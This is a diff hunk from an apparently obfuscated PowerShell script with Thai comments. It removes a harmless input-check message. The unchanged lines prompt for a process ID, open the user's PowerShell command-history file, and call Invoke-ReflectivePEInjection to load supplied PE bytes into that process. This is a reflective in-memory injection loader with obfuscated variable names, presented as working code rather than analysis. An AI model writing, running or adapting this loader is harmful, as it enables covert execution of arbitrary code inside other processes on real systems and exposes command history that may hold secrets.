@@ -47,12 +47,6 @@ Clear-Host
 # 2. รับค่าจากผู้ใช้งาน
  $_0x2AA = Read-Host (@("Enter"," PID") -join "")
 
-# 3. ตรวจสอบว่าใส่ข้อมูลมาหรือไม่ แล้วแสดงข้อความสำเร็จ
-if ($0x2AA) {
-    Write-Host "Success! Input received: $0x2AA" -ForegroundColor Green
-} else {
-    Write-Host "No input provided." -ForegroundColor Red
-}
 start $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 
 Invoke-ReflectivePEInjection -PEBytes $_0x5F9 -ProcId $_0x2AA
